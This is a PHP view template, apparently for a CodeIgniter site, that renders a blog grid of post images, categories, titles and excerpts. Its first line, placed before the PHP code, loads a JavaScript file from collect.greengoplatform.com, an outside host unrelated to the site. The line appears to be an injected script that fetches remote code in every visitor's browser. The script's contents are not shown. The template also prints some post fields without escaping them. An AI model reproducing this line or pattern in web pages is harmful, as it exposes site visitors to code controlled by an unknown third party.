<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $url="https://templates.hibootstrap.com/solit/default/";?>
<script src="<?=base_url().'assets/bo'?>/assets/vendor/libs/masonry/masonry.js"></script>

<?php $this->load->view("frontoffice/component/headerPage",["controller"=>"Blog"]) ?>
<section class="blog-grid ptb-100 bg-thin">
    <div class="container">
        <div class="row justify-content-center" data-masonry='{"percentPosition": true }'>
            <?php foreach ($row as $val): $link=base_url().'blog/'.$val['slug'] ?>
                <div class="col-6 col-xs-6 col-lg-4">
                    <div class="blog-item-single">
                        <div class="blog-item-img">
                            <a href="<?=$link?>">
                                <img src="<?=base_url().$val['gambar']?>" alt="blog-bg-image" />
                            </a>
                            <p class="tag"><?=$val['kategori']?></p>
                        </div>
                        <div class="blog-item-content">
                            <a href="<?=$link?>">
                                <h3><?=strSubstring($val['judul'],50)?></h3>
                            </a>
                            <p><?=strSubstring(strip_tags($val['deskripsi']),100)?></p>
                        </div>
                    </div>
                </div>
            <?php endforeach; ?>
        </div>
    </div>
</section>
